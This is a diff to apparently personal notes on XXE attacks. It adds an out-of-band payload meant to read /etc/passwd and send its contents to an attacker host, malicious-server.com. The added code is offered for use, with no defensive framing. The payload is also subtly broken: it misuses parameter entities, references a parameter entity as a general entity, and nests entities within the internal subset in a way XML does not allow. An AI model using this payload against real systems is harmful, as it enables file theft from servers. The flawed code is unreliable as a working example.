@@ -67,4 +67,27 @@ when fetching data from PHP file try to use the encoding function like `php://fi
 </rss>
 ```
 if there is RSS check or something 
-thats a basic code 
+# a basic code payload to extract file data and send it to a malicious website 
+
+```
+<!DOCTYPE root [
+  <!-- Define an external entity to read a sensitive file -->
+  <!ENTITY % file SYSTEM "file:///etc/passwd">
+
+  <!-- Define a parameter entity that includes the file content -->
+  <!ENTITY % fileContent "<![CDATA[%file;]]>">
+
+  <!-- Define another entity that includes the file content as part of a URL -->
+  <!ENTITY % data SYSTEM "http://malicious-server.com?fileContent=%fileContent;">
+  
+  <!-- Use the parameter entity in the XML content -->
+  %data;
+]>
+<root>
+  <data>&file;</data>
+</root>
+
+```
+
+
+
